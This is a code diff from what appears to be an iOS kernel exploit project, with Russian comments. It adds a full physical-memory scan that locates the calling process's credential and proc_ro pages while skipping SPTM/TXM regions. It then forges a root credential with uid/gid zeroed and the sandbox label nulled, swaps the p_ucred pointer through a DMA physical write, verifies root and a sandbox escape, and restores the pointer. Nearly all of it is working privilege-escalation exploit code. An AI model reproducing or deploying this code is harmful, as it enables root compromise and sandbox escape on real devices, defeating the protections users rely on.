@@ -8154,50 +8154,122 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         }
                     }
                 }
-                // 1.9.279 (р.72): таблицы ucred/proc_ro системно deadly (276/278),
-                // табличные DMA-записи fenced (277/278) → ucredPA берём ФИЗМАП-СКАНОМ,
-                // без таблиц вообще. ucred лежит в физстранице на том же uoff; physmap
-                // CPU-читаемо (ctlPA-валидации). Фильтр кандидатов: тип фрейма = тип
-                // страницы нашего proc (zone-data, её PA walker отдаёт каждый бут).
-                // Сигнатура: cr_label(raw)@+0x78 + uid@+0x18 → сверка 0x100 байт.
-                if (!pagePA && !pswapRoot && ucF && selfProcM && gFrameTableVA) {
+                // 1.9.280: SCAN-Z2 — ПОЛНЫЙ физмап-скан (все недeadly кадры).
+                // 279: тип ucred ≠ типу proc (0x21) — фильтр по типу снят. Пропускаем
+                // только deadly-типы (таблицы) и PA-спаны SPTM/TXM (чтение EL2-домена
+                // через physical aperture = паника). Physmap — ЛИНЕЙНЫЙ
+                // (pa-gPhysBase+gVirtBase), не phystokv: у PAPT дыры, кадр мог утонуть.
+                // Две сигнатуры: (a) страница ucred — label(raw)@+0x78 + uid@+0x18 →
+                // ucredPA → контент-форж; (b) страница proc_ro — поле p_ucred==ucF +
+                // 3 соседних qword → roFieldPA → PSWAP-B ниже. Обе цели — data-фреймы,
+                // DMA туда ложится (р.72 Q3); таблицы не нужны вообще.
+                uint64_t roFieldPA = 0;
+                if (!pagePA && !pswapRoot && ucF && roF && gFrameTableVA) {
+                    uint32_t ucFieldOff = koffsetof(proc_ro, ucred);
                     uint32_t uoff2 = (uint32_t)(ucF & 0x3fff);
+                    uint32_t roOff = (uint32_t)((roF + ucFieldOff) & 0x3fff);
                     uint64_t labelQ = early_kread64(ucF + 0x78);
                     uint32_t uid32 = (uint32_t)early_kread64(ucF + 0x18);
                     uint8_t ucImg[0x100];
                     for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(ucImg + i) = early_kread64(ucF + i);
-                    uint64_t lvlC = 3, ltC = 0;
-                    uint64_t gpaC = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvlC, &ltC);
-                    int tProc = gpaC ? kpFrameTypeOf(gpaC & ~0x3fffULL) : -1;
-                    uint64_t nF = kconstant(physSize) >> 14;
-                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] старт: uoff=%#x label=%#llx uid=%u tProc=0x%x frames=%#llx",
-                              uoff2, (unsigned long long)labelQ, uid32, tProc, (unsigned long long)nF]);
-                    if (uoff2 + 0x100 <= 0x4000 && tProc >= 0) {
-                        uint64_t cands = 0;
+                    uint64_t roFp0 = roOff >= 8 ? early_kread64(roF + ucFieldOff - 8) : 0;
+                    uint64_t roFp1 = early_kread64(roF + ucFieldOff + 8);
+                    uint64_t roFp2 = early_kread64(roF + ucFieldOff + 0x10);
+                    uint64_t pB = kconstant(physBase), pS = kconstant(physSize), vB = kconstant(virtBase);
+                    uint64_t sptmPA = pB + (kconstant(staticSptmBase) - kconstant(staticBase));
+                    uint64_t txmPA  = pB + (kconstant(staticTxmBase)  - kconstant(staticBase));
+                    uint64_t nF = pS >> 14;
+                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] старт: uoff=%#x label=%#llx uid=%u roOff=%#x ucF=%#llx frames=%#llx",
+                              uoff2, (unsigned long long)labelQ, uid32, roOff, (unsigned long long)ucF, (unsigned long long)nF]);
+                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] скип PA-спаны: SPTM %#llx..%#llx TXM %#llx..%#llx",
+                              (unsigned long long)sptmPA, (unsigned long long)(sptmPA + 0xF4000),
+                              (unsigned long long)txmPA, (unsigned long long)(txmPA + 0x64000)]);
+                    if (uoff2 + 0x100 <= 0x4000) {
+                        uint64_t reads = 0;
                         uint64_t idx = 0;
-                        for (; idx < nF && !pagePA; idx++) {
-                            uint64_t pa = kconstant(physBase) + (idx << 14);
+                        for (; idx < nF && (!pagePA || !roFieldPA); idx++) {
+                            uint64_t pa = pB + (idx << 14);
+                            if ((idx & 0x7FFF) == 0)
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] прогресс %#llx/%#llx (чтений %llu)",
+                                          (unsigned long long)idx, (unsigned long long)nF, (unsigned long long)reads]);
+                            if (pa >= sptmPA && pa < sptmPA + 0xF4000) continue;
+                            if (pa >= txmPA && pa < txmPA + 0x64000) continue;
                             int t = kpFrameTypeOf(pa);
-                            if ((idx & 0xFFFF) == 0)
-                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] прогресс: %#llx/%#llx, кандидатов %llu",
-                                          (unsigned long long)idx, (unsigned long long)nF, (unsigned long long)cands]);
-                            if (t != tProc) continue;
-                            cands++;
-                            uint64_t pkva2 = phystokv(pa);
-                            if (!pkva2) continue;
-                            if (early_kread64(pkva2 + uoff2 + 0x78) != labelQ) continue;
-                            if ((uint32_t)early_kread64(pkva2 + uoff2 + 0x18) != uid32) continue;
-                            BOOL full = YES;
-                            for (uint32_t i = 0; i < 0x100; i += 8)
-                                if (early_kread64(pkva2 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
-                            kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] кандидат pa=%#llx: label+uid сошлись, сверка 0x100 — %@",
-                                      (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо"]);
-                            if (full) pagePA = pa;
+                            if (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18) continue;   // таблицы — deadly
+                            uint64_t pkva2 = pa - pB + vB;   // линейный physmap, без дыр PAPT
+                            reads++;
+                            // (a) страница ucred: label + uid на тех же смещениях
+                            if (!pagePA && early_kread64(pkva2 + uoff2 + 0x78) == labelQ &&
+                                (uint32_t)early_kread64(pkva2 + uoff2 + 0x18) == uid32) {
+                                BOOL full = YES;
+                                for (uint32_t i = 0; i < 0x100; i += 8)
+                                    if (early_kread64(pkva2 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ucred-кандидат pa=%#llx: label+uid сошлись, сверка 0x100 — %@",
+                                          (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                                if (full) pagePA = pa;
+                            }
+                            // (b) страница proc_ro: поле==ucF + 3 соседа (анти-ложные)
+                            if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000 &&
+                                early_kread64(pkva2 + roOff) == ucF &&
+                                early_kread64(pkva2 + roOff - 8) == roFp0 &&
+                                early_kread64(pkva2 + roOff + 8) == roFp1 &&
+                                early_kread64(pkva2 + roOff + 0x10) == roFp2) {
+                                roFieldPA = pa + roOff;
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ★ proc_ro поле: pa=%#llx (p_ucred==ucF + соседи) — PSWAP-B вооружён",
+                                          (unsigned long long)roFieldPA]);
+                            }
                         }
-                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] финиш: кадров=%#llx кандидатов=%llu pagePA=%#llx — %@",
-                                  (unsigned long long)idx, (unsigned long long)cands, (unsigned long long)pagePA,
-                                  pagePA ? @"ucredPA НАЙДЕН ★" : @"мимо (тип не тот — понадобится гистограмма)"]);
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] финиш: кадров=%#llx чтений=%llu ucredPA=%#llx roFieldPA=%#llx — %@",
+                                  (unsigned long long)idx, (unsigned long long)reads,
+                                  (unsigned long long)pagePA, (unsigned long long)roFieldPA,
+                                  (pagePA || roFieldPA) ? @"ЦЕЛЬ НАЙДЕНА ★" : @"мимо — по census-типам доберём"]);
                     }
+                }
+                // [PSWAP-B] roFieldPA из скана — тот же p_ucred swap, но без walker'а
+                // (таблица proc_ro deadly системно, 276/278/279). physmap-форж ucred,
+                // один physwrite8 в поле, readback-верификация, root, restore.
+                if (roFieldPA && !pswapRoot && svc && ttM && isTable && ucF && roF) {
+                    uint64_t ucFieldVA = roF + koffsetof(proc_ro, ucred);
+                    uint8_t *fp3 = valloc(0x4000);
+                    for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(fp3 + i) = early_kread64(ucF + i);
+                    *(uint32_t *)(fp3 + 0x18) = 0;  // cr_uid
+                    *(uint32_t *)(fp3 + 0x1c) = 0;  // cr_ruid
+                    *(uint32_t *)(fp3 + 0x20) = 0;  // cr_svuid
+                    *(uint32_t *)(fp3 + 0x28) = 0;  // cr_groups[0]
+                    *(uint32_t *)(fp3 + 0x68) = 0;  // cr_rgid
+                    *(uint32_t *)(fp3 + 0x6c) = 0;  // cr_svgid
+                    *(uint64_t *)(fp3 + 0x78) = 0;  // cr_label = NULL → sandbox off
+                    mlock(fp3, 0x4000);
+                    uint64_t fpPA3 = vtophys(ttM, (uint64_t)fp3);
+                    uint64_t fpKVA3 = fpPA3 ? (fpPA3 - kconstant(physBase) + kconstant(virtBase)) : 0;   // линейный physmap
+                    kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] forge page: PA=%#llx KVA=%#llx → поле %#llx",
+                              (unsigned long long)fpPA3, (unsigned long long)fpKVA3, (unsigned long long)roFieldPA]);
+                    if (fpKVA3 && kpLooksLikeKernelPointer(fpKVA3)) {
+                        BOOL wP = kpPhysWrite8v2(svc, tsdV, ttM, isTable, roFieldPA & ~0x3fffULL,
+                                                 (uint32_t)(roFieldPA & 0x3fff), fpKVA3, r);
+                        uint64_t rb = early_kread64(ucFieldVA);
+                        kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] запись=%@ readback=%#llx (ждём %#llx) → %@",
+                                  wP ? @"kr=0" : @"МИМО", (unsigned long long)rb, (unsigned long long)fpKVA3,
+                                  rb == fpKVA3 ? @"P_UCRED ПЕРЕКЛЮЧЁН ✓" : @"НЕ ПРИЛИПЛО"]);
+                        if (rb == fpKVA3) {
+                            uid_t gu = getuid(); gid_t gg = getgid();
+                            kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] getuid()=%u getgid()=%u", gu, gg]);
+                            if (gu == 0) {
+                                pswapRoot = YES;
+                                kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — p_ucred swap через DART physwrite (scan-найденное поле, physmap-форж) ===");
+                                FILE *fpf = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                                kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] sandbox-проба (запись в /var/mobile): %@",
+                                          fpf ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ"]);
+                                if (fpf) { fputs("root via p_ucred swap (scan)\n", fpf); fclose(fpf); }
+                            }
+                            usleep(1000000);
+                            kpPhysWrite8v2(svc, tsdV, ttM, isTable, roFieldPA & ~0x3fffULL,
+                                           (uint32_t)(roFieldPA & 0x3fff), ucF, r);   // restore
+                            kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] restore: readback=%#llx (ждём %#llx)",
+                                      (unsigned long long)early_kread64(ucFieldVA), (unsigned long long)ucF]);
+                        }
+                    }
+                    munlock(fp3, 0x4000); free(fp3);
                 }
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
